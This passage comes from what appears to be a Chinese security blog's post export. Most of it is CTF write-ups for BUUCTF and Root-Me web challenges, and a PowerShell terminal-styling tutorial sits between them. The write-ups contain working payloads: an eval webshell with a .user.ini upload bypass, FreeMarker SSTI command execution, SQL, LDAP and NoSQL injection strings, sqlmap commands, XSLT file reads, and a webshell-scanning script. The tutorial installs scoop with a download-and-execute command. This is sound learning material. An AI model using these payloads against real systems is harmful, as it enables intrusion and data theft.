b'4d0e23092964816df16361fb5c24837359dfaa27fd5245ea60db0c826abb46162ecb232dda4904ed7df8e07e2d404cdb6c53b91bedad4272448cde3f9d0691df', 'csrf_token': b'4f8f97534c20b73684f4887b534d36ee2429c38f', 'name': 'admin', 'user_id': '1'}\" -s \"ckj123\"\n```\n\n可以得到cookie\n\n```\n.eJxNkMGKwjAURX9leGsXMdWN4EKJU1J4L1QyE_I24mjVJtaBqmgj_vtUV7M9cA-c-4DVrq3OB5hc2ms1gFW9hckDPn5gApSXN7Y6oYqdsV4YtZCc-zsFlOi4JocdqX2ihEPjlo13i44kR7JakPs-UJhHH-bBKC29K2pSr21x9FJ3mIrI-UIYOxPsyqz3jtjOMrZFJDUTXi5ranCIUo_RFUfOP3uuMwylMDlFttQYV94oxHu_ncJzAJtzu1tdfmN1-pfQa0PMyKLwSd982CQKe8GhHBm1rV-cFUp2X32KHvuEI95P37rTuql6xXrb1CcYwPVcte93YAjPP_KyYzs.XkTsFA.YOebiET5QoqNJ-EXRqMFRBrKHg8\n```\n\n![](buuctf/9.png)\n\n*******\n\n本题还有其它解法\n\n**方法二：**\n\n\npass\n\n# [强网杯 2019]高明的黑客\n\n题目直接给出了源码，下载之后是三千多个shell，但是大部分都不能用，需要找出能够使用的，方法是通过匹配`$_POST`或`$_GET`来执行命令，这里可以使用`echo`命令，因为该命令既在PHP下可以执行，在shell条件下也可以执行，此外，如果一个一个试的话速度会非常慢，我们需要使用多线程来增加速度，代码如下\n\n```python\nimport re\nimport requests\nimport os\nimport multiprocessing as mp\n\nurl = 'http://192.168.75.144/'\nflag = 1  # 在得到可用shell之后退出线程\ndef test_shell(filename):\n    global flag\n    if flag:\n        command = \"echo 'aesm1p';\"\n        with open(filename) as f:\n            cont = f.read()\n            # POST\n            catches = re.findall(r\"\\$_POST\\['(\\S+)'\\]\", cont)\n            for para in catches:\n                data = {para: command}\n                res = requests.post(url+filename, data=data).content.decode('utf-8')\n                if 'aesm1p' in res:\n                    flag = 0\n                    print('Success! url is {}. payload: {}'.format(url + filename, para))\n                    break\n            # GET\n            catches = re.findall(r\"\\$_GET\\['(\\S+)'\\]\", cont)\n            for para in catches:\n                res = requests.get(url + filename + '?' + para + '=' + command).content.decode('utf-8')\n                if 'aesm1p' in res:\n                    flag = 0\n                    print('Success! url is {}'.format(url + filename + '?' + para + '=' + command))\n                    break\n            return 0\n    else:\n        return 0\n\nif __name__ == '__main__':\n    files = os.listdir('src/')\n    pool = mp.Pool(processes=30)\n    for file in files:\n        pool.apply_async(test_shell,args = ('src/' + file,))\n    pool.close()\n    pool.join()\n```\n\n![](buuctf/10.png)\n\n![](buuctf/11.png)\n\n# [RoarCTF 2019]Easy Calc\n\n本题考点是php的字符串解析特性\n\nPHP在将查询字符串（在URL中或者在正文中）转化为`$_GET`或`$_POST`数组时，会将一些字符删除或用下划线替代，它在解析时会做两件事\n\n> 1. 删除某些空白字符\n2. 将某些字符转换为下划线\n\n例如下面这段代码\n\n```php\n<?php\nvar_dump($_GET);\nvar_dump($_POST);\n?>\n```\n\n![](buuctf/12.png)\n\n可以看到，在get参数中`[`被转换成了`_`，而字段名`前面的空格`被置空，但是字段名`后面的空格`会被保留\n\n这个特性在绕过某些waf时可以用到，如某些waf对`user_id`字段有过滤，我们可以使用字段`user[id`来绕过，waf不会检测该字段，但是到了PHP后端则又会被转化为`user_id`，从而成功绕过WAF。\n\n---------------\n\n本题中，查看源代码\n\n```\n<!--I've set up WAF to ensure security.-->\n```\n\n给出了calc.php的代码\n\n```php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n```\n\n本来我以为calc.php中的过滤即为waf，但是及时我们输入符合过滤规则题目也会触发报错，应该是加了waf，那么我们的请求的流程就是`提交请求->waf过滤->calc.php中再次过滤并执行`，这样的话按照上面的思路，我们可以在字段`num`前面加个空格，waf不会过滤该字段(因为该字段为` num`)，在PHP后端又会解析为`num`，这样就绕过了过滤\n\n```\nhttp://node3.buuoj.cn:27779/calc.php?%20num=phpinfo()\n```\n\n查看禁用函数\n\n![](buuctf/13.png)\n\n发现命令执行的函数被禁用了，那么我们可以使用`scandir`函数来获得目录，用`file_get_contents`来读文件，因为引号被过滤了，所以我们用asicc码来构造文件名\n\n![](buuctf/14.png)\n\n\n![](buuctf/15.png)\n\nPS: 通过查看题目waf过滤规则可以看到题目过滤的仅仅是参数`num`，如果被拦截则会返回403\n\n```\nSecRule ARGS:num \"@rx [a-zA-Z_\\x7f-\\xff\\x00-\\x24][a-zA-Z_0-9\\x7f-\\xff\\x00-\\x24]*\" \"id:001,msg:'Hack',severity:ERROR,deny,status:403\"\n```\n\n-------\n\n此题目还有另一种方法可以绕过，就是利用HTTP走私攻击[https://paper.seebug.org/1048/](https://paper.seebug.org/1048/)，当请求包含两个`Content-Length`时可以实现HTTP走私\n\n![](buuctf/16.png)\n\n因为waf服务器看到请求头中有两个content-length会返回400错误，但是后端却依然会处理该请求\n\n# [SUCTF 2019]CheckIn\n\n题目简化了一下,直接给出了源码，核心部分如下\n\n```php\nif (isset($_POST[\"upload\"])) {\n    $tmp_name = $_FILES[\"fileUpload\"][\"tmp_name\"];\n    $name = $_FILES[\"fileUpload\"][\"name\"];\n    if (!$tmp_name) {\n        die(\"filesize too big!\");\n    }\n    if (!$name) {\n        die(\"filename cannot be empty!\");\n    }\n    $extension = substr($name, strrpos($name, \".\") + 1);\n    if (preg_match(\"/ph|htacess/i\", $extension)) {\n        die(\"illegal suffix!\");\n    }\n    if (mb_strpos(file_get_contents($tmp_name), \"<?\") !== FALSE) {\n        die(\"&lt;? in contents!\");\n    }\n    $image_type = exif_imagetype($tmp_name);\n    if (!$image_type) {\n        die(\"exif_imagetype:not image!\");\n    }\n    $upload_file_path = $userdir . \"/\" . $name;\n    move_uploaded_file($tmp_name, $upload_file_path);\n    echo \"Your dir \" . $userdir. ' <br>';\n    echo 'Your files : <br>';\n    var_dump(scandir($userdir));\n}\n```\n\n过滤有三个：\n\n> 1. 文件名中不得出现`ph`或`htacess`\n2. 文件内容不得以`<?`开头\n3. exif_imagetype()函数校验图片\n\n依次绕过：\n\n> 1. 上传文件后缀修改为jpg\n2. 用标签`<script language=\"php\">phpinfo();@eval($_REQUEST['snow']);</script>`来包裹PHP语句\n3. 添加文件头\n\n接下来就是设法将jpg文件解析为PHP文件从而getshell，通过`.user.ini`文件可以实现该功能，在PHP官方文档中有详细的解释\n\n[](https://www.php.net/manual/zh/configuration.file.per-user.php)\n\n![](buuctf/17.png)\n\nPHP启动时会在每个目录下扫描.user.ini文件，从被执行的PHP文件目录开始一直上升到web根目录。如果被执行的PHP文件在web根目录之外，则只扫描该目录。需要注意的是**在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。**[https://www.php.net/manual/en/ini.list.php](https://www.php.net/manual/en/ini.list.php)可以查询配置名和设置模式，其中，有两个设置项很关键\n\n> **auto_prepend_file**: 指定在加载主文件之前解析的文件，相当于在主文件最前面加一个`require`语句\n**auto_append_file**： 与上面类似，只不过是在主文件结束之后解析\n\n所以攻击思路就是先上传一个.user.ini文件，指定要包含的jpg文件；然后上传jpg文件getshell\n\n上传`.user.ini`文件\n\n![](buuctf/18.png)\n\n`#difine ...` 是为了绕过exif_imagetype()函数\n\n然后上传`exp.jpg`\n\n![](buuctf/19.png)\n\n然后即可getflag\n\n```\nhttp://ec4f3f55-24f4-49f2-84e5-58b3b5f49a95.node3.buuoj.cn/uploads/76d9f00467e5ee6abc3ca60892ef304e/index.php?snow=system(%27cat%20/flag%27);\n```\n\n![](buuctf/20.png)\n\n> 这个漏洞感觉实际利用可能性不大，因为不大可能会有奇葩程序员会在保存上传文件的文件夹下放一个可执行的PHP文件\n","tags":["CTF","Web"],"categories":["复现"]},{"title":"oh-my-posh美化PowerShell","url":"/2020/03/22/psbeautify/","content":"\n爱美之心，人皆有之\n\n<!-- more -->\n\nWindows下的shell真的是丑出天际，字体也非常别扭，之前用的cmder，刚开始相比cmd的话，确实是美观多了，不过使用了一段时间之后又觉得很丑了，而且cmder实现原理在于把一些常用的linux命令在windows下编译为可执行文件，这样就导致一定的命令延迟，这让我觉得莫名的别扭（好吧，我就是审美奇葩），在加上最近准备把powershell作为主力shell，而默认的PowerShell比CMD还要感人，需要进行一下美化\n\noh-my-posh是windows下的主题工具，借鉴于linux下的oh-my-zsh，我此次就是利用该工具来美化PS\n\n# 安装包管理器\n\n`scoop`是Windows下一款非常好用的包管理工具，能够自动设置环境变量，类似于linux下的apt等包管理工具，官网[Click Here](https://scoop.sh/)\n\n```\nSet-ExecutionPolicy RemoteSigned -scope CurrentUser # 设置powershell执行策略\nInvoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh') # 安装scoop\n```\n\n安装完成后，输入`scoop`，如下所示即说明安装成功\n\n![](psbeautify/1.png)\n\n安装git与posh-git\n\n```\nscoop install -g git\nscoop bucket add extras\nscoop install posh-git\n```\n\n安装oh-my-posh\n\n```\nscoop install oh-my-posh\n```\n\n安装过程中如果出现超时错误的话请扶墙\n\n# 安装字体\n\n中文环境下，默认的ps字体不仅不美观，而且很多特殊字符也不支持，这会导致后面修改主题时看不到效果，出现乱码，而powershell的字体要求非常高，一般的字体无法在原生的ps终端使用，根据其它大佬的测试，`Sarasa Gothic`字体是符合ps的苛刻要求的，[Github地址](https://github.com/be5invis/Sarasa-Gothic/releases)\n\n**安装powerline字体**\n\n除了上述字体之外，还可以安装powerline系列字体，能够很好的适配，Github地址[在这](https://github.com/powerline/fonts)\n下载之后选择自己喜欢的字体安装，也可以运行`install.ps1`全部安装\n\n# 启用oh-my-posh\n\n接下来需要编写配置文件，才能够让配置每次自动生效，配置路径在`$profile`中，我们可以输入该变量查看配置文件位置\n\n```\n➜ $profile\nC:\\Users\\Snow\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\n```\n\n配置文件内容如下\n\n```\nImport-Module DirColors\nImport-Module Posh-git\nImport-Module oh-my-posh\n```\n\n`DirColors`是一个对输出进行着色的模块\n\n**配置主题：**\noh-my-posh内置多个主题，使用`Set-Theme`命令可以预览主题，TAB键可以切换不同的主题，我个人比较喜欢`Honukai`主题\n在修改主题后，需要将改动写入配置文件`$profile`中，否则下次启动就还是原主题，在配置文件中加一行内容\n\n```\nSet-Theme Honukai\n```\n**修改配置：**\n\n输入`$ThemeSettings`可以查看当前设置\n\n修改用户名\n\n```\n$ThemeSettings.CurrentUser = 'aesm1p'\n```\n\n如果想要永久生效需要将上述命令写入配置文件`$profile`\n\n# 第三方终端\n\n在按照上述方法配置之后，PS就能够使用了。不过，虽然原生PS运行效率高，速度快，可由于PS太过底层，导致颜值控们进行美化修改时存在诸多限制，比如字体，上文提到的能在原生ps下使用的字体寥寥无几，选择空间有限，而且界面配色，背景等设置在PS中也非常困难，而通过第三方终端可以很方便的进行设置美化\n\n## Windows Terminal\n\n个人最推荐的一款，微软爸爸官方开源，维护很及时，而且字体的锯齿消除做的是最好的，而且官方应用优化也是更加的独到，缺点是目前配置主要使用json文件来配置，没有gui界面，对小白不太友好，不过WindowsTerminal有完善的官方文档指导还是很贴心的。\n安装该软件需要windows10版本为1903以上，可以通过Microsoft Store安装，也可以在github下载安装，通过store安装的话能够自动更新，手动安装无法自动获取更新。\n安装完成之后进入软件打开设置`settings.json`，设置文件结构为：\n```json\n{\n  \"theme\": \"light\", //主题有light,dark,system三种\n  \"profiles\": //配置选项\n  {\n    \"defaults\":\n    {\n      //此处添加全局配置\n    },\n    \"list\":\n    [\n      //单独配置\n    ]\n  },\n  \"schemes\": //配色方案，以列表形式存储\n  [\n    {},//scheme\n  ],\n  \"keybindings\"://绑定快捷键，具体可修改的快捷键参数可以查阅官方文档\n  [\n    {},\n  ]\n}\n```\n了解清楚配置文件结构之后添加相应的配置参数即可，主要是字体大小，配色方案，键绑定等，这里贴上我的配置方案\n```json\n// This file was initially generated by Windows 终端(未打包) 1.2.200825001-release1.2\n// It should still be usable in newer versions, but newer versions might have additional\n// settings, help text, or changes that you will not see unless you clear this file\n// and let us generate a new one for you.\n\n// To view the default settings, hold \"alt\" while clicking on the \"Settings\" button.\n// For documentation on these settings, see: https://aka.ms/terminal-documentation\n{\n    \"$schema\": \"https://aka.ms/terminal-profiles-schema\",\n\n    // \"defaultProfile\": \"{61c54bbd-c2c6-5271-96e7-009a87ff44bf}\",\n    \"theme\": \"light\",\n\n    // You can add more global application settings here.\n    // To learn more about global settings, visit https://aka.ms/terminal-global-settings\n\n    // If enabled, selections are automatically copied to your clipboard.\n    \"copyOnSelect\": false,\n\n    // If enabled, formatted data is also copied to your clipboard\n    \"copyFormatting\": false,\n\n    // A profile specifies a command to execute paired with information about how it should look and feel.\n    // Each one of them will appear in the 'New Tab' dropdown,\n    //   and can be invoked from the commandline with `wt.exe -p xxx`\n    // To learn more about profiles, visit https://aka.ms/terminal-profile-settings\n    \"profiles\":\n    {\n        \"defaults\":\n        {\n            // Put settings here that you want to apply to all profiles.\n            \"name\":\"PowerShell\",\n            \"source\": \"Windows.Terminal.PowershellCore\",\n            \"colorScheme\": \"One Half Dark\",\n            \"cursorColor\":\"#FFFFFF\",\n            \"fontFace\":\"Meslo LG M for Powerline\",\n            \"fontSize\":10,\n            \"cursorShape\":\"filledBox\",\n            \"startingDirectory\":\"your dir\",\n            \"backgroundImage\" : \"image path\",\n            \"backgroundImageOpacity\": 0.3\n        },\n        \"list\":\n        [\n            {\n                // Make changes here to the powershell.exe profile.\n                \"guid\": \"{61c54bbd-c2c6-5271-96e7-009a87ff44bf}\",\n                \"name\": \"Windows PowerShell\",\n                \"commandline\": \"powershell.exe\",\n                \"hidden\": false\n            },\n            {\n                // Make changes here to the cmd.exe profile.\n                \"guid\": \"{0caa0dad-35be-5f56-a8ff-afceeeaa6101}\",\n                \"name\": \"命令提示符\",\n                \"commandline\": \"cmd.exe\",\n                \"hidden\": false\n            },\n            // {\n            //     \"guid\": \"{b453ae62-4e3d-5e58-b989-0a998ec441b8}\",\n            //     \"hidden\": false,\n            //     \"name\": \"Azure Cloud Shell\",\n            //     \"source\": \"Windows.Terminal.Azure\"\n            // }\n            {\n                \"guid\": \"{b453ae62-4e3d-5e58-b989-0a998ec441b8}\",\n                \"hidden\": false,\n                \"name\": \"Azure\",\n                \"source\": \"Windows.Terminal.Azure\"\n            },\n            {\n                \"guid\": \"{b453ae62-4e3d-5e58-b989-0a998ec44156}\",\n                \"name\": \"Python InterAction\",\n                \"commandline\": \"py\",\n                \"hidden\": false\n            }\n        ]\n    },\n\n    // Add custom color schemes to this array.\n    // To learn more about color schemes, visit https://aka.ms/terminal-color-schemes\n    \"schemes\": [\n        {\n                \"name\" : \"Frost\",\n                \"background\" : \"#FFFFFF\",\n                \"black\" : \"#3C5712\",\n                \"blue\" : \"#17b2ff\",\n                \"brightBlack\" : \"#749B36\",\n                \"brightBlue\" : \"#27B2F6\",\n                \"brightCyan\" : \"#13A8C0\",\n                \"brightGreen\" : \"#89AF50\",\n                \"brightPurple\" : \"#F2A20A\",\n                \"brightRed\" : \"#F49B36\",\n                \"brightWhite\" : \"#741274\",\n                \"brightYellow\" : \"#991070\",\n                \"cyan\" : \"#3C96A6\",\n                \"foreground\" : \"#000000\",\n                \"green\" : \"#6AAE08\",\n                \"purple\" : \"#991070\",\n                \"red\" : \"#8D0C0C\",\n                \"white\" : \"#6E386E\",\n                \"yellow\" : \"#991070\"\n            }\n    ],\n\n    // Add custom keybindings to this array.\n    // To unbind a key combination from your defaults.json, set the command to \"unbound\".\n    // To learn more about keybindings, visit https://aka.ms/terminal-keybindings\n    \"keybindings\":\n    [\n        // Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.\n        // These two lines additionally bind them to Ctrl+C and Ctrl+V.\n        // To learn more about selection, visit https://aka.ms/terminal-selection\n        { \"command\": {\"action\": \"copy\", \"singleLine\": false }, \"keys\": \"ctrl+c\" },\n        { \"command\": \"paste\", \"keys\": \"ctrl+v\" },\n\n        // Press Ctrl+Shift+F to open the search box\n        { \"command\": \"find\", \"keys\": \"ctrl+shift+f\" },\n\n        // Press Alt+Shift+D to open a new pane.\n        // - \"split\": \"auto\" makes this pane open in the direction that provides the most surface area.\n        // - \"splitMode\": \"duplicate\" makes the new pane use the focused pane's profile.\n        // To learn more about panes, visit https://aka.ms/terminal-panes\n        { \"command\": { \"action\": \"splitPane\", \"split\": \"auto\", \"splitMode\": \"duplicate\" }, \"keys\": \"alt+shift+d\" },\n        {\"command\": \"closeTab\", \"keys\": \"ctrl+delete\"}\n    ]\n}\n```\n最终效果如下：\n![](psbeautify/12.png)\n\n## Fluent Terminal\n\n我最先使用的是这款，在github上搜索，然后下载后用ps运行文件夹下的`Install.ps1`即可，效果如下：\n\n![](psbeautify/2.png)\n\n比起PS来已经美观多了，不过吹毛求疵的我还是感觉到了一丝丝不爽：\n1. 启动时有时会加载不出左侧的命令提示符，或者比较慢，需要按下回车才能出来，总之初始化有时会有点卡\n2. 字体稍微有点模糊，锯齿略明显（在字体小的情况下），而且显示效果不舒服\n3. 设置项较少，跟不上我~~装X~~追求完美的步伐\n4. 复制粘贴时有点问题，有时候只能整行复制，选取不到某段字符\n\n## ConEmu\n\n[官网](https://www.fosshub.com/ConEmu.html)下载安装即可\n\n### 界面配置\n\n设置默认以PS启动\n\n![](psbeautify/3.png)\n\n设置字体\n\n![](psbeautify/9.png)\n\n设置背景图片\n\n![](psbeautify/4.png)\n\n设置PS为默认shell\n\n![](psbeautify/5.png)\n\n### 设置配色\n\n使用colortool来进行设置，colortool是微软出的一个powershell配色工具，支持Iterm主题\n\n安装\n\n```\nscoop install colortool\n```\n\n待续\n\n**颜色设置**\n\nPS的字体颜色中有许多很暗的颜色的，比如在输入`-xxxx`选项是黑灰色，分辨度很差，我们可以自己修改成想要的颜色，点击\"settings\"，转到颜色选项卡\n\n选择自己喜欢的颜色方案\n\n![](psbeautify/10.png)\n\n然后下面第8个一般是暗色，这个就是控制上述选项的（我是和我shell中的颜色对比确定的），我们选择一个自己喜欢的颜色，效果如下，清楚了许多\n\n![](psbeautify/11.png)\n\n其它颜色修改也可以参照上面的方法自己DIY，最后记得要保存成自己的颜色方案\n\n# 效果展示\n\n**cmder**（该软件也有丰富的设置项，只是我没怎么搞而已，也是一个不错的软件）\n\n![](psbeautify/6.png)\n\n**Fluent Terminal**\n\n![](psbeautify/7.png)\n\n**ConEmu**\n\n![](psbeautify/8.png)\n\n------------\n\n[https://sspai.com/post/52868](https://sspai.com/post/52868)\n[https://iterm2colorschemes.com/](https://iterm2colorschemes.com/)\n[https://github.com/JanDeDobbeleer/oh-my-posh](https://github.com/JanDeDobbeleer/oh-my-posh)","tags":["PowerShell","美化"],"categories":["教程"]},{"title":"Rootme网站做题记录(二)","url":"/2019/08/06/rootme1/","content":"\n\n# 前言\n\n接上篇writeup\n\n<!--more-->\n\n# 正文\n\n## PHP type juggling\n\nPHP弱类型比较，提示**类型欺骗** ，查看官方文档点击 [此处](http://php.net/manual/zh/types.comparisons.php)\n\n题目代码如下\n\n```php\n<?php\n// $FLAG, $USER and $PASSWORD_SHA256 in secret file\nrequire(\"secret.php\");\n// show my source code\nif(isset($_GET['source'])){\n    show_source(__FILE__);\n    die();\n}\n$return['status'] = 'Authentication failed!';\nif (isset($_POST[\"auth\"]))  { \n    // retrieve JSON data\n    $auth = @json_decode($_POST['auth'], true);\n    // check login and password (sha256)\n    if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){\n        $return['status'] = \"Access granted! The validation password is: $FLAG\";\n    }\n}\nprint json_encode($return);\n```\n\n关键语句如下：\n\n```php\nif($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){\n        $return['status'] = \"Access granted! The validation password is: $FLAG\";\n    }\n```\n\n第一个比较可以利用字符串与布尔值比较的强制类型转换绕过，即是当一个字符串与布尔真比较时会判断相等成立，第二个比较可以利用数组绕过\n\n![松散比较表](rootme/1.png)\n\nPS：本题还需要注意json的赋值\n\n![payload](rootme/2.png)\n\n## Remote File Inclusion\n\n相关博客介绍[链接](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)\n\n在自己的vps上一个PHP文件，文件名要以`_lang.php` 结尾，例如 `456_lang.php`，写入如下内容\n\n```php\n<?php\n$con = file_get_contents('index.php');\necho $con;\n?>\n```\n\n然后提交请求\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch13/?lang=http://your_vps_ip/456\n```\n\n**注意**：这里的PHP文件不能是可执行的PHP文件，换句话说应该使服务器将PHP文件当做文本而不执行其代码，可以考虑使用Nginx服务器（默认不支持PHP），这样的话代码就不会被执行，然后再提交。\n\n## Server-side Template Injection\n\n这道题目又让我学到了新东西，这题的知识点是服务器端模板注入（SSTI），成因在于一些模板引擎对于用户输入的内容过滤不严谨，导致一些输入被当做代码执行了，类似于XSS漏洞，具体可以 [Click Here](http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/)\n\n****\n\n回到本题中，当我们提交内容之后\n\n![](rootme1/3.png)\n\n我们输入的内容会在页面中显示，查看代码\n\n```java\nfunction checkNickname() {\n\t\tvar serviceUrl = \"check\";\n\t\tvar nick = $(\"#nickname\").val();\n\t\tvar postData = \"nickname=\" + encodeURIComponent(nick);\n\t\t$.ajax({\n\t\t\turl : serviceUrl,\n\t\t\ttype : \"POST\",\n\t\t\tdata : postData,\n\t\t\tcontentType : \"application/x-www-form-urlencoded\",\n\t\t\tdataType : \"text\",\n\t\t\tsuccess : function(data) {\n\t\t\t\t$(\"#result\").text(data);\n\t\t\t},\n\t\t\terror : function(data) {\n\t\t\t\t$(\"#result\").text(\"An error occurs!\");\n\t\t\t}\n\t\t};\n\t}\n```\n\n核心代码在于\n\n```java\nsuccess : function(data) {\n\t\t\t\t$(\"#result\").text(data);\n},\n```\n\n此处应该是存在漏洞点，我们尝试输入 `${3*3}` ，可以看到回显\n\n![](rootme1/4.png)\n\n我们输入的3\\*3被成功计算执行了，说明此处是存在漏洞的，虽然漏洞发现了，但是如何构造payload我还是一头雾水，还好查到了资料[Click Here!](http://www.vuln.cn/6934) ，猜测这应该是FreeMarker模板（至少我看不出来，应该是我太菜了！23333），按照它的payload尝试一下\n\n```java\n<#assign ex=\"freemarker.template.utility.Execute\"?new()> \n${ ex(\"ls -a\") } \n```\n\n果然得到了回显！！\n\n![](rootme/5.png)\n\n读取文件即可\n\n```java\n<#assign ex=\"freemarker.template.utility.Execute\"?new()> \n${ ex(\"cat SECRET_FLAG.txt\") } \n```\n\n## SQL injection - authentication\n\n直接万能密码 `login=admin'--+&password=123456`\n\n## SQL injection - authentication - GBK\n\n应该是宽字节注入，很常规，然而我被工具给坑了，换了原版的hackbar终于可以了，相关知识点可以查看我的其他文章\n\n```\nlogin=admin%df' or 1=1%23&password=12345\n```\n\n## SQL injection - string\n\n题目是SQLite的注入，其实很常规，But，我tmd的找错注入位置了， 还是我太菜了，注入点在search界面，由于sqlite数据库不是很熟悉，所以还费了点功夫，payload如下\n\n- 手工注入\n\n查看表\n\n```sql\nrecherche=asdf' or 1=2 union select name,2 from sqlite_master--+\n```\n\n查看表结构\n\n```sql\nrecherche=asdf' or 1=2 union select sql,2 from sqlite_master--+\n```\n\npayload\n\n```sql\nrecherche=asdf' or 1=2 union select username,password from users--+\n```\n\n- SQLmap注入方法\n\n```\npython sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\" --data=\"recherche=asdf\"  --tables -p recherche\n```\n\n```\npython sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\" --data=\"recherche=asdf\"  -D users -p recherche --dump-all\n```\n\n## XSLT - Code execution\n\nXSLT，可扩展样式表语言转换，可以对XML进行转换，存在xslt服务器端注入攻击，可以参考文章\n\n> https://www.cnblogs.com/r00tuser/p/7255939.html\n\n我们可以考虑注入PHP代码\n\n```xml\n<?xml version=\"1.0\" encoding='utf-8'?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n<xsl:template match=\"/\">\n<p><xsl:value-of select=\"php:function('getcwd')\"/></p>\n</xsl:template>\n</xsl:stylesheet>\n```\n\n利用该php函数可以获取当前目录，本题目要求我们读取.passwd文件，所以我们第一要做的事情是列目录，尝试了scandir函数，发现会返回Array，尝试了去读取array内容但是失败了，经过一个朋友提醒，换了另一个函数opendir函数，这个本来之前也用过，只是没有成功，再次尝试一下\n\n![](rootme1/11.png)\n\n可以列出目录\n\n![](rootme1/12.png)\n\n我们再依次读子目录，在子目录下发现目标文件，直接读取目标文件即可\n\n```xml\n<p><xsl:value-of select=\"php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')\"/></p>\n```\n\n<!-- X5L7_R0ckS -->\n\n## LDAP injection - authentication\n\n**LDAP：** 轻量级目录访问协议，是以树状的层次结构来存储数据，本质上其实是一种非关系型数据库，有以下特点\n\n>- LDAP的结构用树来表示，而不是用表格。正因为这样，就不能用SQL语句了\n>- LDAP可以很快地得到查询结果，不过在写方面，就慢得多\n>- LDAP提供了静态数据的快速查询方式\n>- Client/server模型，Server 用于存储数据，Client提供操作目录信息树的工具\n>- 这些工具可以将数据库的内容以文本格式（LDAP 数据交换格式，LDIF）呈现在您的面前\n>- LDAP是一种开放Internet标准，LDAP协议是跨平台的Interent协议\n\n要做这道题，我们需要了解一些简单的LDAP查询语句：\n\n**AND查询**\n```\n(&(parameter1=value1)(parameter2=value2))\n```\n**OR查询**\n```\n(|(parameter1=value1)(parameter2=value2))\n```\n\n此外还有通配符**\\***，可以匹配任何内容\n\n还有在LDAP中，下面的两个单独符号作为两个特殊常量\n\n> (&) --> TRUE\n(|) --> FALSE\n\n在LDAP注入时，可像SQL注入一样，构造闭合语句即可。\n\n****************\n\n回到本题\n\n尝试输入`add))`，题目返回报错信息\n\n![](rootme1/6.png)\n\n我们可以据此分析LDAP语句为:\n\n```\n(&(uid=username)(userPassword=password))\n```\n\n所以输入我们提交的内容之后，语句就为\n\n```\n(&(uid=ad)))(userPassword=fasd))\n```\n\n由于括号未构成闭合，所以导致出错。\n\n那么我们通过构造永真式即可绕过验证\n\n如果提交`username=*)(|(uid=*&password=aa)`，那么在服务器端就变成了\n\n```\n(&(uid=*)(|(uid=*)(userPassword=aa)))\n```\n\n此语句逻辑是 `uid=*` 与 `userPassword=aa` 执行或操作，显然结果是true，之后该结果再与`uid=*`执行与操作，结果也为true，于是就绕过了验证，成功得到flag！\n\n还有一些也是可以的，具体逻辑请自行分析\n\n```\nusername = *\npassword = *)(&\n```\n\n```\nusername: *)(|(userPassword=\npassword: *)\n```\n\n## NoSQL injection - authentication\n\n一个新的知识点，关于MongoDB的注入，是一种非关系型数据库\n\n> 传统的SQLi手段是不可行的。因为MongoDB所要求的输入形式是json的格式，例如：find({'key1';'value1'})在实际的使用中(PHP环境下)，一般是这样使用$collection->find(array('key'=> 'value'));\n\n\n**条件操作符**\n\n```\n$gt : >\n$lt : <\n$gte: >=\n$lte: <=\n$ne : !=、<>\n$in : in\n$nin: not in\n$all: all \n$or:or\n$not: 反匹配(1.3.3及以上版本)\n模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })\n/**\n* : 范围查询 { \"age\" : { \"$gte\" : 2 , \"$lte\" : 21}}\n* : $ne { \"age\" : { \"$ne\" : 23}}\n* : $lt { \"age\" : { \"$lt\" : 23}}\n*/\n\n```\n\n既然它有如此的特征，那么 我们可以结合PHP的数组绕过来解决这一问题，本题就是这样的一个实例\n\n题目要求我们输入用户名和密码，那么我们用数组尝试绕过一下\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch38/?login[$lt]=test&pass[$ne]=1\n```\n\n返回结果\n\n> You are connected as : admin\n\n当我们换一个时\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch38/?login[$lt]=admin&pass[$ne]=1\n```\n\n则又会返回是以test登录，但是这两个都无法得到flag，说明这个题目应该还存在一个隐藏用户，我们要设法以这个用户登录进去才可获得flag，我们可以尝试一下正则\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=^[^(a|t)]&pass[$ne]=1\n```\n\n这样就可以匹配到第三个账号了\n\n还有一种方法\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch38/?login[$lt]=test&login[$gt]=admin&pass[$ne]=1\n```\n\n通过字符串比较来达到绕过的效果。\n\n## Path Truncation\n\n网上查找了一下资料，发现一篇文章[Click Here](https://www.dailysecurity.fr/les-path-truncations/)，不知道是那种语言，反正用有道翻译勉强可以看懂，主要内容如下：\n\n> 在PHP5.3版本以下，PHP能够接受的字符串最大长度为 `2^12`，也就是4096，所以如果我们提交的路径长度超出4096之后，就会发生一些奇怪的事情，例如\n```\ninclude(\"/etc/passwd/./././././././././././././[4096 plus tard]/.\")\n```\n\n> 被翻译成\n```\ninclude(\"/etc/passwd\");\n```\n> 于是成功的绕过了验证\n\n> 此外，还需要注意路径的大小，它必须保持奇数，比如 `admin.php` 有9个字符，而 `admin.html` 则是有10个字符，这意味着你必须平衡道路上的字符数，否则就不会正确地使用，例如：`x/../admin.html` 可以成功，Windows下还可以用 